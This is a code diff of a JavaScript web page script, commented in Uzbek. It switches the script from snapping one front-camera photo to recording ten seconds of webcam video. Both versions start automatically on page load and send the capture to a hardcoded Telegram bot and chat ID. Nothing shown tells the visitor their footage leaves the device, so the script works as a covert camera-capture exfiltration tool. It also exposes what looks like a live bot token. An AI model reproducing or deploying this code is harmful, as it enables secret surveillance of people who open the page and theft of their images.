@@ -1,63 +1,44 @@
+const video = document.getElementById('video');
+let mediaRecorder;
+let chunks = [];
+
 // Telegram bot tokeni va chat ID
 const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
 const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying
 
-// Video elementini tanlang
-const video = document.getElementById('video');
+// Kamera oqimini olish
+function startCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+            // MediaRecorder obyekti yaratish
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (event) => {
+                chunks.push(event.data);
+            };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                sendVideoToTelegram(blob);
+            };
 
-// MediaStream orqali old kamerani ishlatish
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Old kamera
-    .then(stream => {
-        video.srcObject = stream;
-
-        // Video to'liq yuklanganda hodisani kutish
-        video.addEventListener('loadeddata', () => {
-            if (video.readyState >= 2) {
-                // 5 soniya kutib surat olishni boshlash
-                setTimeout(() => {
-                    takePicture();
-                }, 5000);
-            }
+            // 10 soniya davomida video yozish
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 10000); // 10 soniya
+        })
+        .catch(error => {
+            console.error('Xato:', error);
         });
-    })
-    .catch(error => {
-        console.error('Xato:', error);
-    });
-
-// Suratga olish funksiyasi
-function takePicture() {
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-
-    // Video o'lchamlarini olish
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    // Agar video o'lchamlari to'g'ri yuklangan bo'lsa, surat oling
-    if (canvas.width && canvas.height) {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Rasmni base64 formatida olish
-        const imageData = canvas.toDataURL('image/png');
-        sendPhotoToTelegram(imageData);
-    } else {
-        console.error('Video olchamlari togri yuklanmadi.');
-    }
 }
 
-// Telegram bot orqali surat yuborish
-function sendPhotoToTelegram(imageData) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
-    // Base64 formatdagi suratni blobga aylantirish
-    const blob = dataURLtoBlob(imageData);
-
-    // FormData obyekti yaratish
+// Telegram bot orqali video yuborish
+function sendVideoToTelegram(blob) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, 'photo.png');
+    formData.append('video', blob, 'video.webm');
 
-    // Suratni yuborish
     fetch(url, {
         method: 'POST',
         body: formData
@@ -65,7 +46,7 @@ function sendPhotoToTelegram(imageData) {
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            console.log('Surat yuborildi!');
+            console.log('Video yuborildi!');
         } else {
             console.error('Telegram API xatosi:', data);
         }
@@ -75,14 +56,5 @@ function sendPhotoToTelegram(imageData) {
     });
 }
 
-// Base64 formatdagi suratni blobga aylantirish
-function dataURLtoBlob(dataURL) {
-    const [header, data] = dataURL.split(',');
-    const mime = header.match(/:(.*?);/)[1];
-    const binary = atob(data);
-    const array = [];
-    for (let i = 0; i < binary.length; i++) {
-        array.push(binary.charCodeAt(i));
-    }
-    return new Blob([new Uint8Array(array)], { type: mime });
-}
+// Kamera ishga tushirish va avtomatik video yozishni boshlash
+startCamera();
